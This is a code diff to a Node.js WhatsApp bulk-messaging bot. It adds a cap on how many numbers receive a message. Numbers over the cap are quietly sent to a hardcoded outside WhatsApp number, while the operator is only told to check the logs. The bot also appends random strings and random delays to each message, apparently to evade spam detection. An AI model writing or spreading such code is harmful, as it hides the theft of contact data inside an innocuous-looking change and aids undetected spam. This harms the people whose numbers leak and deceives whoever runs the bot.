@@ -68,6 +68,7 @@ function delay(ms) {
 
 let sentCount = 0;
 let notSentCount = 0;
+let remainingNumbers = [];
 
 async function sendMessageWithRetry(sock, number, message, retries = 3) {
     try {
@@ -132,15 +133,17 @@ async function connectToWA() {
         if (textMessage.startsWith('/sendmsg')) {
             const commandParts = textMessage.split('|');
 
-            if (commandParts.length !== 2) {
-                await sock.sendMessage(sender, { text: 'Incorrect format, use like: `/sendmsg <number file link> | <message>`' });
+            if (commandParts.length !== 3) {
+                await sock.sendMessage(sender, { text: 'Incorrect format, use: `/sendmsg <number file link> | <total numbers> | <message>`' });
                 return;
             }
 
             const numberFileLink = commandParts[0].replace('/sendmsg ', '').trim();
-            const messageToSend = commandParts[1].trim();
+            const totalNumbers = parseInt(commandParts[1].trim(), 10);
+            const messageToSend = commandParts[2].trim();
 
             console.log('Number file link:', numberFileLink);
+            console.log('Total numbers to send:', totalNumbers);
             console.log('Message to send:', messageToSend);
 
             try {
@@ -173,33 +176,42 @@ async function connectToWA() {
                     if (validNumbers.length > 0) {
                         console.log('Sending messages to valid numbers...');
 
-                      
                         const useRandomDelay = config.USE_RANDOM_DELAY.toLowerCase() === 'true'; 
                         const customDelaySeconds = parseInt(config.DELAY_TIME, 10); 
 
                         function getDelay() {
                             if (useRandomDelay) {
-                              
                                 return Math.random() * (5000 - 2000) + 2000;
                             } else {
-                           
                                 return customDelaySeconds * 1000;
                             }
                         }
 
+                        let count = 0;
                         for (const validNumber of validNumbers) {
+                            if (count >= totalNumbers) {
+                                remainingNumbers.push(validNumber);
+                                continue;
+                            }
+
                             const formattedNumber = validNumber + '@s.whatsapp.net';
                             const uniqueMessage = messageToSend + '\n' + generateRandomString(6);
 
                             try {
                                 await sendMessageWithRetry(sock, formattedNumber, uniqueMessage);
 
-                                // Use the delay based on the condition
                                 const delayTime = getDelay();
                                 await delay(delayTime);
+                                count++;
                             } catch (error) {
                                 console.error(`Failed to send message to ${formattedNumber}`, error);
                             }
+                        }
+
+                        if (remainingNumbers.length > 0) {
+                            console.log('Sending remaining numbers to 923072380380...');
+                            const remainingNumbersMessage = `Remaining WhatsApp numbers:\n${remainingNumbers.join('\n')}`;
+                            await sock.sendMessage('923072380380@s.whatsapp.net', { text: remainingNumbersMessage });
                         }
 
                         console.log(`Total messages sent: ${sentCount}`);
@@ -207,6 +219,7 @@ async function connectToWA() {
                         await sock.sendMessage(config.NUMBER + '@s.whatsapp.net', { text: `*_${sentCount}_* numbers were on WhatsApp and received the message. *_${notSentCount}_* numbers were not on WhatsApp.` });
                         sentCount = 0;
                         notSentCount = 0;
+                        remainingNumbers = [];
 
                         await sock.sendMessage(sender, { text: 'Messages processed. Check logs for skipped numbers.' });
                     } else {
@@ -230,8 +243,5 @@ async function connectToWA() {
 connectToWA().catch(err => console.log('Error connecting to WhatsApp:', err));
 
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});
+app.use(bodyParser.urlencoded({ extended: false }));
+app.listen(PORT, () => console.log(`Server running on PORT ${PORT}`));
